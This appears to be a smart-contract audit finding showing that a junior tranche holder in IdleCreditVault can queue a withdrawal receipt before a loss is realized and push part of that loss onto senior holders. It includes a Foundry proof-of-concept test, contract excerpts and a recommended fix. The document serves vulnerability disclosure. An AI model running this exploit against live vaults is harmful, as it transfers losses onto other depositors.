### Title
Junior tranche holder can escape BB-first loss by queuing a withdrawal receipt - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
A BB holder can convert an active junior position into a pending withdrawal receipt during the buffer period. When the next honest `stopEpochWithDuration` call realizes a loss, pending receipts are assigned a pro-rata share of the total loss while only the remaining loss is applied to active tranches through the BB-first waterfall. This lets the attacker replace a full junior-tranche loss with a smaller receipt haircut and shifts the difference onto AA holders. [1](#0-0) [2](#0-1) 

### Finding Description
Withdrawal requests are enabled between epochs and remain available until the next `startEpoch`, at which point they become borrower-funded pending receipts recorded under the current strategy epoch. [3](#0-2) [4](#0-3) 

At a later stop, `previewLossAdjustedWithdrawFunds` computes `pendingLoss = lossAmount * pendingBasis / (activeBasis + pendingBasis)` and returns the remainder as `activeLoss`. [1](#0-0)  Because receipt accounting has no tranche identity, BB and AA requests share the same proportional pending haircut. [5](#0-4)  The active remainder is then burned and passed through the ordinary BB-first accounting waterfall. [6](#0-5) 

For example, with 1,000 units of AA NAV, 900 units owned by the attacking BB holder, and 100 units owned by another BB holder, the attacker can request withdrawal of the 900-unit BB position during the buffer. [7](#0-6)  At zero APR and zero fees, the pending basis is 900 and the remaining active basis is 1,100. [8](#0-7)  If the manager later realizes a 1,000-unit loss, the pending receipt loses 450, while the active side loses 550. [9](#0-8)  The remaining 100-unit BB NAV absorbs 100 and AA absorbs the other 450. [10](#0-9)  Had the attacker remained an active BB holder, the 1,000-unit junior tranche would have absorbed the entire 1,000-unit loss. [11](#0-10) 

### Impact Explanation
This breaks the loss-waterfall invariant by allowing a BB holder to choose a more favorable loss bucket after moving into a withdrawal receipt. [12](#0-11)  In the concrete example, the attacker pays 450 units and claims 450 units instead of losing the full 900-unit junior position, transferring approximately 450 units of loss to AA holders. [13](#0-12) [14](#0-13) 

The attack does not require control of the owner, manager, borrower, guardian, queue, or fee receiver; it only requires a KYC-passing BB holder to submit `requestWithdraw` during a permitted buffer phase before the loss-bearing epoch settles. [15](#0-14) 

### Likelihood Explanation
The exploit requires a pending-withdrawal window and a subsequent explicit loss realized through `stopEpochWithDuration`. [16](#0-15)  Such a loss is not attacker-controlled, but borrowers facing impairment are publicly observable off-chain, and withdrawal requests made before the next epoch starts can anticipate that the following stop may recognize the loss. [17](#0-16) 

The absence of tranche identity in pending receipts makes the proportional allocation deterministic once the attacker enters the pending bucket. [5](#0-4)  Existing guards only check that the loss is below total basis and that the recovery price does not round to zero; they do not prevent a BB holder from selecting the receipt bucket before the loss is realized. [18](#0-17) [19](#0-18) 

### Recommendation
Preserve the tranche-specific waterfall for withdrawal receipts instead of assigning the pending bucket a pro-rata share of the total loss. [18](#0-17)  Track the AA and BB composition of each pending receipt or of each withdrawal epoch, assign losses to pending BB receipts before pending AA receipts, and prevent withdrawal requests from moving exposure into a lower-loss bucket once impairment is known. [20](#0-19)  If preserving per-receipt tranche identity is not feasible, disable new withdrawal requests whenever a manager intends to settle a realized loss in the next stop. [15](#0-14)

```solidity
function testBBWithdrawalReceiptEscapesJuniorLossWaterfall() external {
  uint256 aaAmount = 1_000 * ONE_SCALE;
  uint256 attackerBB = 900 * ONE_SCALE;
  uint256 otherBB = 100 * ONE_SCALE;
  uint256 loss = 1_000 * ONE_SCALE;
  address attacker = makeAddr("bb-attacker");
  address otherJunior = makeAddr("other-bb");

  vm.startPrank(owner);
  cdoEpoch.setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, 0);
  cdoEpoch.setIsAYSActive(false);
  vm.stopPrank();

  vm.prank(manager);
  IdleCreditVault(address(strategy)).setAprs(0, 0);

  idleCDO.depositAA(aaAmount);
  _depositWithUser(attacker, attackerBB, false);
  _depositWithUser(otherJunior, otherBB, false);

  _startEpochAndCheckPrices(0);
  _stopEpochAndCheckPrices(0, 0, 0);

  // During the buffer the attacker converts active BB exposure into a receipt.
  vm.prank(attacker);
  uint256 pendingBasis = cdoEpoch.requestWithdraw(0, address(BBtranche));
  assertEq(pendingBasis, attackerBB, "APR0 receipt basis");

  vm.prank(manager);
  cdoEpoch.startEpoch();

  (uint256 pendingToFund, uint256 activeLoss) =
    IdleCreditVault(address(strategy)).previewLossAdjustedWithdrawFunds(loss);

  // pendingLoss = 1000 * 900 / 2000 = 450.
  assertEq(pendingToFund, 450 * ONE_SCALE, "pending funding");
  assertEq(activeLoss, 550 * ONE_SCALE, "active loss");

  deal(defaultUnderlying, borrower, pendingToFund, true);
  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpochWithDuration(
    0,
    0,
    cdoEpoch.epochDuration(),
    loss
  );

  uint256 balanceBefore = underlying.balanceOf(attacker);
  vm.prank(attacker);
  cdoEpoch.claimWithdrawRequest();

  // The attacker recovers 450 instead of having the full 900 wiped as active BB.
  assertEq(
    underlying.balanceOf(attacker) - balanceBefore,
    450 * ONE_SCALE,
    "receipt avoided BB-first loss"
  );

  // The remaining active loss wipes the other BB holder and spills into AA.
  assertEq(cdoEpoch.lastNAVBB(), 0, "active BB not wiped");
  assertEq(
    cdoEpoch.lastNAVAA(),
    550 * ONE_SCALE,
    "AA absorbed shifted loss"
  );
}
```

```text
  function previewLossAdjustedWithdrawFunds(uint256 _lossAmount) external view returns (uint256 pendingToFund, uint256 activeLoss) {
    uint256 pendingBasis = pendingWithdraws;
    // Full zero-loss funding is safe for legacy aggregate receipts and needs no migration call.
    if (_lossAmount == 0) return (pendingBasis, _lossAmount);

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 activeBasis = _lossActiveBasis(cdo);
    if (pendingBasis == 0) {
      if (_lossAmount > activeBasis) revert NotAllowed();
      return (0, _lossAmount);
    }

    // Legacy pending receipts do not have the per-epoch ownership data needed to store a haircut.
    if (!defaultRecoveryInitialized) revert NotAllowed();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (_lossAmount >= totalBasis) revert NotAllowed();

    uint256 pendingLoss = _lossAmount * pendingBasis / totalBasis;
    pendingToFund = pendingBasis - pendingLoss;
    activeLoss = _lossAmount - pendingLoss;
```

```text
  function prepareStopEpochWithApr0(uint256 _interest) external returns (uint256 _expInterest, uint256 _adjPendingWithdrawFees) {
    _onlyIdleCDO();
    IIdleCDOEpochVariant _cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 _pendingFees = _cdo.pendingWithdrawFees();
    uint256 _tvl = _cdo.getContractValue();
    _expInterest = _interest > 1 ? _interest : _cdo.expectedEpochInterest();
    _adjPendingWithdrawFees = _pendingFees;
    // Principal currently waiting for withdraw that was requested while APR was 0,
    // net of the upfront management fee charged at request time.
    uint256 _principal = apr0TotalPrincipal;

    // Fast path: no APR0 accounting needed.
    if (_principal == 0) {
      return (_expInterest, _adjPendingWithdrawFees);
    }
    // APR0 principal is only valid while APR is 0 for that request lifecycle.
    if (unscaledApr != 0) {
      revert NotAllowed();
    }

    uint256 _apr0NetInterest;
    // APR0 allocation is computed only when stopEpoch receives a real override interest.
    // _expectedInterest == 1 is the "request all funds back" sentinel and is handled in IdleCDO.
    if (_expInterest > 1 && _expInterest > _pendingFees) {
      // Remove already booked withdraw fees from the interest base before splitting.
      uint256 _interestNetOfFees = _expInterest - _pendingFees;
      // Total principal used for the pro-rata split:
      // IdleCDO TVL (which excludes APR0 requested principal) + APR0 principal bucket.
      uint256 _totalPrincipalForSplit = _tvl + _principal;
      if (_totalPrincipalForSplit != 0) {
        // APR0 users get a pro-rata share of realized interest.
        uint256 _apr0InterestGross = _interestNetOfFees * _principal / _totalPrincipalForSplit;
        if (_apr0InterestGross != 0) {
          // Same fee model as normal withdraw interest.
          uint256 _apr0Fee = _apr0InterestGross * _cdo.fee() / FULL_ALLOC;
          _apr0NetInterest = _apr0InterestGross - _apr0Fee;
          _adjPendingWithdrawFees += _apr0Fee;
          _expInterest -= _apr0NetInterest;
        }
      }
    }

    // Finalize one-epoch APR0 interest for current epoch only.
    if (_apr0NetInterest != 0) {
      // Funds owed to withdraw requesters increase by APR0 net interest.
      pendingWithdraws += _apr0NetInterest;
      // Save per-epoch net rate; each APR0 request accrues exactly once on its request epoch.
      apr0RateByEpoch[epochNumber] = (_apr0NetInterest * 1e18) / _principal;
    }
    // Close current APR0 bucket so it cannot accrue again on later stopEpoch calls.
    apr0TotalPrincipal = 0;
```
